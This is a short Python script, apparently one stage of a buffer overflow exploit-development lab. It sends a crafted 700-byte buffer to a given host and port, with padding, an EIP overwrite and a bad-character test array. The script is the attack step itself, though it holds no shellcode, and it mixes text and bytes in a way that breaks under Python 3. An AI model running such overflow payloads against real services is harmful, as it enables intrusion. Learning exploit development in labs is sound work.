#!/usr/bin/env python3
# stage 5 - testing for bad characters in Immunity 
# usage: ./badchars [RHOST] [RPORT]
import socket,sys


RHOST = sys.argv[1]
RPORT = int(sys.argv[2])

# handle connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# setup payload 
offset = 146
total_buff_size = 700
badchars_test = open("C:\\Program Files (x86)\\Immunity Inc\\Immunity Debugger\\bytearray.bin", "rb").read()

buff = ""
payload = "\x41" * (offset - len(buff))                   # lead padding
eip = "\x42" * 4                                          # saved return pointer overwrite 
esp = badchars_test                                       # where esp should be pointing
postfix = "\n"              
trail_padding = "\x44" * (total_buff_size - len(buff) - len(payload) - len(eip) - len(esp) - len(postfix))

# verify if its the correct length. should be 700 total
# print(len(buff), len(payload), len(eip), len(esp), len(trail_padding), len(postfix))

# final payload
buff += payload + eip + esp + trail_padding + postfix 

# payload status
print("[+] - Sendng Payload - [ {} Bytes ]".format(len(buff)))
s.sendall(buff)
s.close()

